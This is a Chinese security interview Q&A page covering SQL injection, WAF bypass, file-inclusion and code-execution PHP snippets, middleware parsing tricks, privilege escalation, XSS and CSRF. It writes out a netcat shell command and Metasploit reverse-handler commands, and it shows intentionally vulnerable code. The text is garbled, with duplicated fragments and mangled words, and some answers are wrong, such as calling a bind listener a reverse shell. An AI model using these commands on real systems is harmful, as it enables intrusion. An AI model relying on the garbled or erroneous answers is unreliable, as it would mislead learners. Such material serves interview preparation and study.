<p>这⾥的 O 代表存储的是对象（object）, 假如你给 serialize() 传⼊的是⼀个数组，那它会变成字⺟ a。7 表示对象的名称 </p>
<p>有 7 个字符。”chybeta” 表示对象的名称。1 表示有⼀个值。{s:4:”test”;s:3:”123”;} 中，s 表示字符串，4 表示该字符串的 </p>
<p>⻓度，”test” 为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传⼊⼀个精⼼构造的序列 </p>
<p>化字符串 控 对象内部的变 甚 数化字符串，从⽽控制对象内部的变量甚⾄是函数。 </p>
<p>JAVA Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、⽂件、数据库中，ObjectOutputStream 类 </p>
<p>的 writeObject() ⽅法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类 </p>
<p>的 readObject() ⽅法⽤于反序列化。 </p>
<h4 id="4、如果⼀台服务器被⼊侵后-你会如何做应急响应"><a href="#4、如果⼀台服务器被⼊侵后-你会如何做应急响应" class="headerlink" title="4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?"></a>4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?</h4><ol>
<li><p>准备相关的⼯具，查后⻔等⼯具 </p>
</li>
<li><p>初步判断事件类型, 事件等级。 </p>
</li>
<li><p>抑制范围，隔离使受害⾯不继续扩⼤ </p>
</li>
<li><p>查找原因，封堵攻击源。 </p>
</li>
<li><p>业务恢复正常⽔平. </p>
</li>
<li><p>总结，报告，并修复、监控 </p>
</li>
</ol>
<p>以上是常规的回答，想知道你是否有这⽅⾯应急相关的经验，像这类问题甲⽅⾯试⽐较多。 </p>
<h4 id="5、你平时使⽤哪些⼯具-以及对应⼯具的特点"><a href="#5、你平时使⽤哪些⼯具-以及对应⼯具的特点" class="headerlink" title="5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?"></a>5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?</h4><p>AWVS、Masscan、BurpSuite </p>
<p>AWVS 常规漏洞扫描，masscan 快速查找端⼝，burp 重复提交数据包 </p>
<p>想知道是否有⾃⼰开发⼯具，如果没有你对每个安全⼯具有哪些独特的⻅解以及别⼈不知道的技巧⽤法。如：awvs 如何 </p>
<p>批量扫描？burpsuite 如何爆破 401､脱库等、等等… </p>
<h4 id="6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，"><a href="#6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，" class="headerlink" title="6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，"></a>6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，</h4><p>上传漏洞选⼀)PHP 上传，⽆法上传 php、解析、后台没有办法拿到，只有⼀处点可以上传。通过 Windows 特性 shell.php::$DATA， </p>
<p>是⼀个项⽬管理系统</p>
<h4 id="7、如何判断-sql-注⼊，有哪些⽅法"><a href="#7、如何判断-sql-注⼊，有哪些⽅法" class="headerlink" title="7、如何判断 sql 注⼊，有哪些⽅法"></a>7、如何判断 sql 注⼊，有哪些⽅法</h4><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过 sleep, 修眠语句执⾏ 5 秒等，除此之外通过 DNSlog 判断 </p>
<p>是还有传回值 </p>
<h4 id="8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"><a href="#8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？" class="headerlink" title="8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"></a>8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？</h4><p>select * from news where id = ‘$SQL’; </p>
<p>当程序执⾏访问新闻等⼀些操作都会执⾏到 sql 语句进⾏调⽤，如果在此调⽤过程中，提交了不合法的数据，⽽数据库 </p>
<p>⽆法识别则会报错。也就是⼀切输⼊都是有害的。 </p>
<p>注⼊类型有 6 种，可以参考 SQLMAP，报错、盲注、联合、时间、内联、堆叠 </p>
<p>注⼊提交⽅式：GET、POST、Cookies、⽂件头 </p>
<p>利⽤⽅式：具体看什么数据库类型，像 SQLSERVER 可以命令执⾏，MYSQL 写 shell 有些权限⼤也可以执⾏命令但是 </p>
<p>条件是在 lINUX 环境下。 </p>
<p>防范: 边界, CDN -&gt; 脚本语⾔过滤 -&gt; 数据库过滤最⼩权限 -&gt; 主机 </p>
<h4 id="9、为什么有的时候没有错误回显"><a href="#9、为什么有的时候没有错误回显" class="headerlink" title="9、为什么有的时候没有错误回显"></a>9、为什么有的时候没有错误回显</h4><p>没有进⾏错误打印或者错误屏蔽 </p>
<h4 id="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？"><a href="#10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？" class="headerlink" title="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？"></a>10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？</h4><p>在 mysql 中使⽤了 gbk 编码，占⽤ 2 个字节, ⽽ mysql 的⼀种特性, GBK 是多字节编码，它认为两个字节就代表⼀个汉 </p>
<p>字，所以 %df 时候会和转义符 \ %5c 进⾏结合, 所以单引号就逃逸了出来, 当第⼀个字节的 ascii 码⼤于 128，就可以了。</p>
<h4 id="11、CRLF-注⼊的原理"><a href="#11、CRLF-注⼊的原理" class="headerlink" title="11、CRLF 注⼊的原理"></a>11、CRLF 注⼊的原理</h4><p>CRLF 注⼊在 OWASP ⾥⾯被称为 HTTP 拆分攻击（HTTP Splitting）CRLF 是” 回⻋ + 换⾏”（\r\n）的简称, 在 HTTP </p>
<p>协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显 </p>
<p>示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏ </p>
<h4 id="12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？"><a href="#12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？" class="headerlink" title="12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？"></a>12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？</h4><p>5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p>
<p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。 </p>
<h4 id="13、php-ini-可以设置哪些安全特性"><a href="#13、php-ini-可以设置哪些安全特性" class="headerlink" title="13、php.ini 可以设置哪些安全特性"></a>13、php.ini 可以设置哪些安全特性</h4><p>禁⽤ PHP 函数 </p>
<p>允许 include 或打开访问远程资源 </p>
<h4 id="14、php-的-00-截断的原理是什么？"><a href="#14、php-的-00-截断的原理是什么？" class="headerlink" title="14、php 的 %00 截断的原理是什么？"></a>14、php 的 %00 截断的原理是什么？</h4><p>因为在 C 语⾔中字符串的结束标识符 %00 是结束符号，⽽ PHP 就是 C 写的，所以继承了 C 的特性，所以判断为 </p>
<p>%00 是结束符号不会继续往后执⾏ </p>
<p>条件：PHP&lt;5.3.29，且 GPC 关闭 </p>
<h4 id="15、webshell-检测，有哪些⽅法"><a href="#15、webshell-检测，有哪些⽅法" class="headerlink" title="15、webshell 检测，有哪些⽅法"></a>15、webshell 检测，有哪些⽅法</h4><p>grep、关键词、关键函数 </p>
<p>安全狗、D 盾</p>
<p>的 本地包含 洞 什么 段带有 洞的代 ⼿ 的话如何发掘 如 报错 你 怎么16、php 的 LFI，本地包含漏洞原理是什么？写⼀段带有漏洞的代码。⼿⼯的话如何发掘？如果⽆报错回显，你是怎么 </p>
<p>遍历⽂件的？ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($_GET[&#39;fifile&#39;])&#123; </span><br><span class="line"></span><br><span class="line">include $_GET[&#39;fifile&#39;]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>包含的⽂件设置为变量，并且⽆过滤导致可以调⽤恶意⽂件 还可以对远程⽂件包含，但需要开启 allow_url_include = </p>
<p>ON 通过测试参数的地⽅进⾏本地⽂件 / etc/passwd 等包含 如何存在漏洞⽽且没有回显，有可能没有显示在⻚⾯⽽是 </p>
<p>在⽹⻚源代码中，除了些可以利⽤ DNSlog 进⾏获取包含的信息。从 index.php ⽂件⼀级级往读取 也可以利⽤ PHP 封 </p>
<p>装协议读取⽂件 </p>
<h4 id="17、说说常⻅的中间件解析漏洞利⽤⽅式"><a href="#17、说说常⻅的中间件解析漏洞利⽤⽅式" class="headerlink" title="17、说说常⻅的中间件解析漏洞利⽤⽅式"></a>17、说说常⻅的中间件解析漏洞利⽤⽅式</h4><p>IIS 6.0</p>
<p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p>
<p>IIS 7.0/7.5 </p>
<p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p>
<p>Nginx </p>
<p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。 </p>
<p>空字节代码 xxx.jpg%00.php </p>
<p>Apache </p>
<p>上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p>
<p>的 户名密 存放在 张表 密 采 种加密⽅式18、mysql 的⽤户名密码是存放在那张表⾥⾯？mysql 密码采⽤哪种加密⽅式？ </p>
<p>mysql -&gt; users </p>
<p>SHA1 </p>
<h4 id="19、Windows、Linux、数据库的加固降权思路，任选其⼀"><a href="#19、Windows、Linux、数据库的加固降权思路，任选其⼀" class="headerlink" title="19、Windows、Linux、数据库的加固降权思路，任选其⼀"></a>19、Windows、Linux、数据库的加固降权思路，任选其⼀</h4><p>禁⽤ root </p>
<p>禁⽌远程访问 </p>
<p>禁⽌写⼊</p>
<p>单独帐号 </p>
<p>禁⽌执⾏ system 等函数 </p>
<h4 id="20、你使⽤什么⼯具来判断系统是否存在后⻔"><a href="#20、你使⽤什么⼯具来判断系统是否存在后⻔" class="headerlink" title="20、你使⽤什么⼯具来判断系统是否存在后⻔"></a>20、你使⽤什么⼯具来判断系统是否存在后⻔</h4><p>Chkrootkit </p>
<p>Rkhunter </p>
<h4 id="21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？"><a href="#21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？" class="headerlink" title="21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？"></a>21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？</h4><p>类似 phpinfo、⽹站信息 </p>
<p>C 段、⼦域名</p>
<p>历史解析记录 </p>
<p>DDOSzmap 全⽹扫描识别 http 头 </p>
<p>⽹站域名管理员邮箱，注册过的域名等相关信息关联 </p>
<h4 id="22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。"><a href="#22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。" class="headerlink" title="22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。"></a>22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。</h4><p>其实这是⼀个⾮常⼤的话题，渗透⼤部分思路都是如此，⽽⾯试官是想听到你回答不⼀样的答案让⼈眼前⼀亮 如何才做 </p>
<p>到让⼈眼前⼀亮都需要看你的经验，把你实践的过程拿出来说，以及遇到什么问题如何解决，最终取得成果 渗透其它⼤ </p>
<p>同⼩异, ⽽做为渗透者知识的储备、基础扎实、耐⼼、细⼼都是必不可少。 </p>
<h4 id="23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？"><a href="#23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？" class="headerlink" title="23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？"></a>23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？</h4><p>Windows </p>
<p>Windows 服务⽐较多所以⽅法也如此，最基本的就是 Exp 提权，数据库 SQLServer、MYSQL UDF 等、第三⽅软件提 </p>
<p>权。</p>
<p>除此之外提权的成功与否和在于信息收集也⾮常重要，你对这台服务器和管理员了解多少。 </p>
<p>windows 权限提升 (⼆) </p>
<p>Linux </p>
<p>Linux 也是类似，除了 EXP 或者⾼版本的内核⽆法提权之外，通过第三⽅软件和服务，除了提权也可以考虑把这台机器 </p>
<p>当跳版, </p>
<p>达到先进⼊内⽹安全防线最弱的地⽅寻找有⽤的信息，再迂回战术。 </p>
<p>linux 权限提升 </p>
<p>Brief </p>
<p>枚举脚本以 root 权限运⾏的程序 </p>
<p>⽤户安装的软件 </p>
<p>弱⼝令或者明⽂密码 </p>
<p>只能内部访问的服务 </p>
<p>suid 和 guid 错误配置 </p>
<p>滥⽤ sudo 权限 </p>
<p>以 root 权限运⾏的脚本⽂件 </p>
<p>错误的路径配置 </p>
<p>计划任务 </p>
<p>未挂载的⽂件系统</p>
<p>NFS 共享</p>
<p>通过键盘记录仪窃取密码 </p>
<p>其它有⽤的和提权相关的东⻄ </p>
<p>内核提权 </p>
<h4 id="24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上"><a href="#24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上" class="headerlink" title="24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)"></a>24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)</h4><p>Tomcat </p>
<p>NginxApache </p>
<p>Hadhoop </p>
<p>Docker </p>
<p>Jenkins </p>
<p>Zenoss </p>
<p>Jboss </p>
<p>MongoDB </p>
<p>Redis </p>
<p>GlassFish </p>
<h4 id="25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？"><a href="#25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？" class="headerlink" title="25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？"></a>25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？</h4><p>nc -lvvp 7777 -e /bin/bash </p>
<p>bash 是交互式, 否则像 useradd ⽆法执⾏交互</p>
<h4 id="26、CMD-命令⾏如何查询远程终端开放端⼝"><a href="#26、CMD-命令⾏如何查询远程终端开放端⼝" class="headerlink" title="26、CMD 命令⾏如何查询远程终端开放端⼝"></a>26、CMD 命令⾏如何查询远程终端开放端⼝</h4><p>tasklist /svc </p>
<p>netstat -ano </p>
<h4 id="27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路"><a href="#27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路" class="headerlink" title="27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路"></a>27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路</h4><p>可以读取 IIS 信息，知道路径, 如果像 WAMMP 类似构建，通过 @@datadir 知道数据库路径也可以猜测⽹站路径。或者直接写 Shell </p>
<h4 id="28、请写出-Mysql5-数据库中查询库表所有列名的语句"><a href="#28、请写出-Mysql5-数据库中查询库表所有列名的语句" class="headerlink" title="28、请写出 Mysql5 数据库中查询库表所有列名的语句"></a>28、请写出 Mysql5 数据库中查询库表所有列名的语句</h4><p>select COLUMN_NAME from information_schema.COLUMNS where table_name = ‘your_table_name’ and </p>
<p>table_schema = ‘your_db_name’; </p>
<h4 id="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"><a href="#29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤" class="headerlink" title="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"></a>29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤</h4><p><a href="http://www.exp.com/1.php">http://www.exp.com/1.php</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$s_func &#x3D; $_GET[&#39;s_func&#39;]; </span><br><span class="line"></span><br><span class="line">$info &#x3D; $_GET[&#39;info&#39;]; </span><br><span class="line"></span><br><span class="line">$s_func($info); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码执⾏, 通过 assert 调⽤ </p>
<h4 id="30、udf-提权"><a href="#30、udf-提权" class="headerlink" title="30、udf 提权"></a>30、udf 提权</h4><p>MySQL 可以⾃定义函数, 通过⾃定义函数做到类似 xp_cmdshell 效果 </p>
<h4 id="31、SQL-头注⼊点"><a href="#31、SQL-头注⼊点" class="headerlink" title="31、SQL 头注⼊点"></a>31、SQL 头注⼊点</h4><p>UserAgent </p>
<p>Referer </p>
<p>CookieCookie </p>
<p>X-FOR-I </p>
<h4 id="32、php-中命令执⾏涉及到的函数"><a href="#32、php-中命令执⾏涉及到的函数" class="headerlink" title="32、php 中命令执⾏涉及到的函数"></a>32、php 中命令执⾏涉及到的函数</h4><p>eval() </p>
<p>assert() </p>
<p>system() </p>
<p>exec() </p>
<p>shell_exec() </p>
<h4 id="33、SSRF-漏洞的成因-防御-绕过"><a href="#33、SSRF-漏洞的成因-防御-绕过" class="headerlink" title="33、SSRF 漏洞的成因 防御 绕过"></a>33、SSRF 漏洞的成因 防御 绕过</h4><p>模拟服务器对其它资源进⾏请求 IP 探测，如果想漏洞利⽤必需要构造好 Payload 禁⽌跳转，限制协议，内外⽹限制， </p>
<p>URL 限制 针对 IP 格式 </p>
<h4 id="34、mysql-写-shell-有⼏种⽅法"><a href="#34、mysql-写-shell-有⼏种⽅法" class="headerlink" title="34、mysql 写 shell 有⼏种⽅法"></a>34、mysql 写 shell 有⼏种⽅法</h4><p>outfifile、dumpfifile、开启 log 写 webshell </p>
<h4 id="35、Metasploit-打开反向监听的命令"><a href="#35、Metasploit-打开反向监听的命令" class="headerlink" title="35、Metasploit 打开反向监听的命令"></a>35、Metasploit 打开反向监听的命令</h4><p>use exploit/multi/handler </p>
<p>set payload windows/meterpreter/reverse_tcp </p>
<h4 id="36、应急响应的步骤"><a href="#36、应急响应的步骤" class="headerlink" title="36、应急响应的步骤"></a>36、应急响应的步骤</h4><ol>
<li><p>准备已经编译好的⼯具以及取证分析等⼯具⼲净可靠放 U 盘 </p>
</li>
<li><p>初步判断事件的类型 是被⼊侵 ddos 还是其它的原因2. 初步判断事件的类型，是被⼊侵、ddos 还是其它的原因  </p>
</li>
<li><p>⾸先抑制范围、影响范围，隔离使受害⾯不继续扩⼤。 </p>
</li>
<li><p>寻找原因，封堵攻击源。 </p>
</li>
<li><p>把业务恢复⾄正常⽔平 </p>
</li>
<li><p>监控有⽆异常，报告、管理环节的⾃省和改进措施。 </p>
</li>
</ol>
<h4 id="37、有哪些反向代理的⼯具"><a href="#37、有哪些反向代理的⼯具" class="headerlink" title="37、有哪些反向代理的⼯具?"></a>37、有哪些反向代理的⼯具?</h4><p>reGeirg、EW、lcx、Ngrok、frp </p>
<h4 id="38、有什么⽐较曲折的渗透经历"><a href="#38、有什么⽐较曲折的渗透经历" class="headerlink" title="38、有什么⽐较曲折的渗透经历"></a>38、有什么⽐较曲折的渗透经历</h4><p>这个问题想知道你⼯作渗透到什么样的程度，只是简单的漏扫搬砖，还是有毅⼒坚持完成整个渗透，如：对⽬标不放 </p>
<p>弃，坚持⼀个⽉最终通过各种⼿段，曲折的过程拿下⽬标。 </p>
<h4 id="39、怎么查找域控"><a href="#39、怎么查找域控" class="headerlink" title="39、怎么查找域控"></a>39、怎么查找域控</h4><p>⽅法有很多 </p>
<p>1.通过 DNS 查询 </p>
<p>dig -t SRV _gc._tcp.lab.ropnop.com </p>
<p>dig -t SRV _ldap._tcp.lab.ropnop.com </p>
<p>dig -t SRV _kerberos._tcp.lab.ropnop.com </p>
<p>dig -t SRV _kpasswd._tcp.lab.ropnop.com </p>
<p>2.端⼝扫描 </p>
<p>域服务器都会开启 389 端⼝，所以可以通过扫描端⼝进⾏识别。 </p>
<p>3.其实很多域环境⾥，DNS 服务器就是域控制根本不需要怎么找。 </p>
<p>4.各种命令 </p>
<p>dsquery </p>
<p>net group “Domain controllers” </p>
<p>nltest /DCLIST:pentest.com </p>
<p>…… </p>
<h2 id="前端篇"><a href="#前端篇" class="headerlink" title="前端篇"></a>前端篇</h2><h4 id="1、什么是同源策略"><a href="#1、什么是同源策略" class="headerlink" title="1、什么是同源策略?"></a>1、什么是同源策略?</h4><p>源就是主机、协议、端⼝名的⼀个三元组 同源策略 (Same Origin Policy, SOP) 是 Web 应⽤程序的⼀种安全模型，被⼴ </p>
<p>泛地应⽤在处理 WEB 内容的各种客户端上，⽐如各⼤浏览器，微软的 Silverlight，Adobe 的 Flash/Acrobat 等等。 </p>
<h4 id="2、XSS-能⽤来做什么？"><a href="#2、XSS-能⽤来做什么？" class="headerlink" title="2、XSS 能⽤来做什么？"></a>2、XSS 能⽤来做什么？</h4><p>⽹络钓⻥、窃取⽤户 Cookies、弹⼴告刷流量、具备改⻚⾯信息、删除⽂章、获取客户端信息、传播蠕⾍ </p>
<h4 id="3、XSS-的三种类型，防御⽅法"><a href="#3、XSS-的三种类型，防御⽅法" class="headerlink" title="3、XSS 的三种类型，防御⽅法"></a>3、XSS 的三种类型，防御⽅法</h4><p>反射型、Dom Base XSS、存储型 防御⽅法这个只能说个⼤概，毕竟这是⼀个⽐较⼤的话题，⽽且防御的⽅法还得看所 </p>
<p>在的业务等。从⽹络层、主机层、Web 层、数据库，通过 CDN 都有过滤常⻅⼀些攻击⼿法，但不能有 CDN 就以为可</p>
<p>以了，添加 CDN 只是让攻击成本增⾼，开启 HttpOnly，以防确实存在避免 cookies 被获取，CSP 策略、再就是语⾔中 </p>
<p>提供的函数对输⼊过滤，以及输出编码以及 ModSecurity 类的防⽕墙。 </p>
<h4 id="4、存储型-xss-原理"><a href="#4、存储型-xss-原理" class="headerlink" title="4、存储型 xss 原理?"></a>4、存储型 xss 原理?</h4><p>如⽹站留⾔版，把插⼊的记录存储在数据库中，插⼊的代码会⼀直留在⻚⾯上，当其它⽤户访问会从数据库中读取并触 </p>
<p>发漏洞。 </p>
<h4 id="5、你怎么理解-xss-攻击？"><a href="#5、你怎么理解-xss-攻击？" class="headerlink" title="5、你怎么理解 xss 攻击？"></a>5、你怎么理解 xss 攻击？</h4><p>是⼀种被动型，在不知道的情况下触发类似⽆感型，在渗透很多情况下平常的渗透⼿段以及取得⽬标的信息，⽽ XSS 就 </p>
<p>能轻松获取，类似 QQ 邮箱你不可能渗透这么⼤的互联⽹就算可以时间成本都⾮常的⾼，XSS ⽐较有针对性。 </p>
<h4 id="6、如何快速发现-xss-位置？"><a href="#6、如何快速发现-xss-位置？" class="headerlink" title="6、如何快速发现 xss 位置？"></a>6、如何快速发现 xss 位置？</h4><p>各种输⼊的点，名称、上传、留⾔、可交互的地⽅，⼀切输⼊都是在害原则。 </p>
<h4 id="7、Dom-xss-原理-防范"><a href="#7、Dom-xss-原理-防范" class="headerlink" title="7、Dom xss 原理 / 防范"></a>7、Dom xss 原理 / 防范</h4><p>DOM 型 XSS 并不需要服务器解析响应的直接参与触发 XSS 靠的是浏览器 DOM 解析 DOM—based XSS 漏洞是基于⽂ </p>
<p>档对象模型 Document Objeet Model,DOM) 的⼀种漏洞。 </p>
<p>cument.getElementById(“a”).innerHTML=”yyyyyy”; </p>
<p>在输⼊点过滤敏感关键字 </p>
<h4 id="8、DOM-型-XSS-与反射型-XSS-区别？"><a href="#8、DOM-型-XSS-与反射型-XSS-区别？" class="headerlink" title="8、DOM 型 XSS 与反射型 XSS 区别？"></a>8、DOM 型 XSS 与反射型 XSS 区别？</h4><p>DOM 型就是 JavaScript 中的 Document 对象 HTML 注⼊，直接浏览器处理。 </p>
<h4 id="9、如何使得前端-referer-为空"><a href="#9、如何使得前端-referer-为空" class="headerlink" title="9、如何使得前端 referer 为空"></a>9、如何使得前端 referer 为空</h4><p>通过地址栏输⼊、从书签⾥⾯选择或者浏览器的插件 BurpSuite 修改。 </p>
<h4 id="10、cookie-参数，security-⼲什么的"><a href="#10、cookie-参数，security-⼲什么的" class="headerlink" title="10、cookie 参数，security ⼲什么的"></a>10、cookie 参数，security ⼲什么的</h4><p>Httponly：防⽌ cookie 被 xss 偷https：防⽌ cookie 在⽹络中被偷 </p>
<p>Secure：阻⽌ cookie 在⾮ https 下传输，很多全站 https 时会漏掉 </p>
<p>Path : 区分 cookie 的标识，安全上作⽤不⼤，和浏览器同源冲突 </p>
<h4 id="11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"><a href="#11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？" class="headerlink" title="11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"></a>11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？</h4><p>看是否什么类型的 XSS，XSS 反射型看提交的地址，指的参数是哪个位置，通过这个⻚⾯进⾏ fuzzing 测试。如果是存 </p>
<p>储型⻚⾯查找关键字。 </p>
<h4 id="12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法"><a href="#12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法" class="headerlink" title="12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法"></a>12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法</h4><p>CSRF 跨站请求伪造，构造已知的所有参数让对⽅访问, </p>
<p>防护 CSRF: 防御原理：不让你那么容易伪造请求 (cookie 中加⼊随机数，要求请求中带上，⽽攻击者获取不到 cookie </p>
<p>中的随机数, 验证 HTTP Referer 字段, 在请求地址中添加 takon 验证 </p>
<p>CRLF 原理: </p>
<p>HTTP 拆分攻击（HTTP Splitting），CRLF 是” 回⻋ + 换⾏”（\r\n）的简称。 </p>
<p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP </p>
<p>内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏，这样我们就能注⼊⼀些会话 </p>
<p>Cookie 或者 HTML 代码，所以 CRLF Injection ⼜叫 HTTP Response Splitting，简称 HRS。 </p>
<h4 id="13、csrf-如何不带-referer-访问"><a href="#13、csrf-如何不带-referer-访问" class="headerlink" title="13、csrf 如何不带 referer 访问"></a>13、csrf 如何不带 referer 访问</h4><p>通过地址栏，⼿动输⼊；从书签⾥⾯选择；通过实现设定好的⼿势。上⾯说的这三种都是⽤户⾃⼰去操作，因此不算 </p>
<p>CSRF。 </p>
<p>跨协议间提交请求。常⻅的协议：ftp://,http://,https://,fifile://,javascript:,data:. 最简单的情况就是我们在本地打开⼀个</p>
<p>HTML ⻚⾯ 这个时候浏览器地址栏是 fifile:// 开头的 如果这个 HTML ⻚⾯向任何 http 站点提交请求的话 这些请求HTML ⻚⾯，这个时候浏览器地址栏是 fifile:// 开头的，如果这个 HTML ⻚⾯向任何 http 站点提交请求的话，这些请求 </p>
<p>的 Referer 都是空的。那么我们接下来可以利⽤ data: 协议来构造⼀个⾃动提交的 CSRF 攻击。当然这个协议是 IE 不⽀ </p>
<p>持的，我们可以换⽤ javascript: </p>
<h4 id="14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？"><a href="#14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？" class="headerlink" title="14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？"></a>14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？</h4><p>X-Frame-Options </p>
<p>DENY(禁⽌被 加载进任何 frame) </p>
<p>SAMEORIGIN(仅允许被加载进同域内的 frame) </p>
<p>X-XSS-Protection </p>
<p>0（表示禁⽌⽤这个策略） </p>
<p>1（默认，对危险脚本做⼀些标志或修改，以阻⽌在浏览器上熏染执⾏。） </p>
<p>1;mode=block（强制不熏染，在 Chrome 下直接跳转到空⽩⻚，在 IE 下返回⼀个 #符号） </p>
<p>这个策略仅针对反射型，对付不了存储型 XSS，能识别出反射型是因为提交请求的 URL 中带有可疑的 XSS 代码⽚段。 </p>
<p>X-Content-Security-Policy </p>
<h4 id="15、Xss-worm-原理"><a href="#15、Xss-worm-原理" class="headerlink" title="15、Xss worm 原理"></a>15、Xss worm 原理</h4><p>攻击者发现⽬标⽹站存在 XSS 漏洞，并且可以编写 XSS 蠕⾍。利⽤⼀个宿主（如博客空间）作为传播源头进⾏ XSS 攻 </p>
<p>击。</p>
<h4 id="16、Cookie-的-P3P-性质"><a href="#16、Cookie-的-P3P-性质" class="headerlink" title="16、Cookie 的 P3P 性质"></a>16、Cookie 的 P3P 性质</h4><p>HTTP 响应头的 p3 字段是 W3C 公布的⼀项隐私保护推荐标准，该字段⽤于标识是否允许⽬标⽹站的 cookie 被另⼀个</p>
<p>域通过加载⽬标⽹站⽽设置或发送，仅 IE 执⾏了该策略。17、CSRF 有何危害？ </p>
